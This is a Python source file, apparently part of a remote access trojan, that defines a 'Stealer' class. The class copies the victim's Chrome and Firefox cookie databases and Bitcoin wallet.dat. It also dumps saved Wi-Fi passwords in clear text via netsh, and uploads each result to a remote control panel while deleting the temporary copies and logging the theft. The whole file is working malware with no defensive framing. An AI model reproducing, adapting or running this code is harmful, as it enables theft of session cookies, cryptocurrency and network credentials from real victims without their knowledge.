import tempfile, subprocess, re, os, getpass, shutil
from HTTPSocket import HTTPSocket

class Stealer:
    def __init__(self, panelURL, machineID):
        self.C = HTTPSocket(str(panelURL), str(machineID))   # Initiate HTTPSocket Class
        self.tempdir = tempfile.gettempdir() 
        self.username = getpass.getuser()

    def steal_chrome_cookie(self):
        #Chrome DB Path: C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies
        try:
            source = f"C:\\Users\\{self.username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
            destination = f"{self.tempdir}\\CookiesCh.sqlite"
            
            shutil.copyfile(source, destination)    
            
            self.C.Upload(destination)
            os.remove(destination)
            self.C.Send("CleanCommands")
            self.C.Log("Succ", "Stealed Chrome Cookies Successfully")
        except Exception as e:
            print("[Error In Stealer, steal_chrome_cookie() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))        

    def steal_firefox_cookie(self):
        #Firefox DB Path: C:\Users\USERNAME\AppData\Roaming\Mozilla\Firefox\Profiles\q1dyz51w.default\cookies.sqlite            
        try:
            source = f"C:\\Users\\{self.username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\q1dyz51w.default\\cookies.sqlite"
            destination = f"{self.tempdir}\\cookies.sqlite"
            
            shutil.copyfile(source, destination)
            
            self.C.Upload(destination)
            os.remove(destination)
            self.C.Send("CleanCommands")
            self.C.Log("Succ", "Stealed Firefox Cookies Successfully")
        except Exception as e:
            print("[Error In Stealer, steal_firefox_cookie() Function]")
            self.C.Send("CleanCommands")
            if str(e)[:36] == "[Errno 2] No such file or directory:":
                print(f"[Error] : 404 Not Found : Firefox Browser")
                self.C.Log("Fail", "404 Not Found : Firefox Browser") 
            else:
                self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
                print(f"[Error] : {e}")

    def steal_bitcoin_wallet(self):
        try:
            wallet_path = f"C:\\Users\\{self.username}\\AppData\\Bitcoin\\wallet.dat"
            if os.path.exists(wallet_path):
                self.C.Upload(wallet_path)
                self.C.Send("CleanCommands")
                self.C.Log("Succ", "Stealed Bitcoin Wallet Successfully")
            else:
                self.C.Send("CleanCommands")
                self.C.Log("Fail", "Bitcoin Wallet Not Found In Victim PC")                
        except Exception as e:
            print("[Error In Stealer, steal_bitcoin_wallet() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))        

    def steal_wifi_password(self):
        """
        When Called, 
        1. Steals Wifi Password
        2. Saves Result In WifiPassword.txt Inside TEMP directory
        3. Uploads WifiPassword.txt
        4. Atlast Deletes WifiPassword.txt from TEMP directory
        """    
        try:
            os.chdir(self.tempdir)
            command = "netsh wlan show profile"
            result = ""

            networks = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            networks = networks.decode(encoding="utf-8", errors="strict")
            network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks) 

            for network_name in network_names_list:
                try:
                    command = "netsh wlan show profile " + network_name + " key=clear"
                    current_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                    current_result = current_result.decode(encoding="utf-8", errors="strict")        
                    
                    ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))
                    authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
                    cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
                    security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                    password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                    
                    result += "\n\nSSID           : " + ssid[0] + "\n"
                    result += "Authentication : " + authentication[0] + "\n"
                    result += "Cipher         : " + cipher[0] + "\n"
                    result += "Security Key   : " + security_key[0] + "\n"
                    result += "Password       : " + password[0] 
                except Exception:
                    pass
        
            with open("WifiPassword.txt", "w") as f:
                f.write(result)
                
            self.C.Upload(self.tempdir + "\\WifiPassword.txt")   
            os.remove(self.tempdir + "\\WifiPassword.txt")
            self.C.Log("Succ", "Wifi Password Retrived Successfully")
            self.C.Send("CleanCommands")         
        except Exception as e:
            print("[Error In Stealer, steal_wifi_password() Function]")
            print(f"[Error] : {e}")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
            self.C.Send("CleanCommands")           
                    
        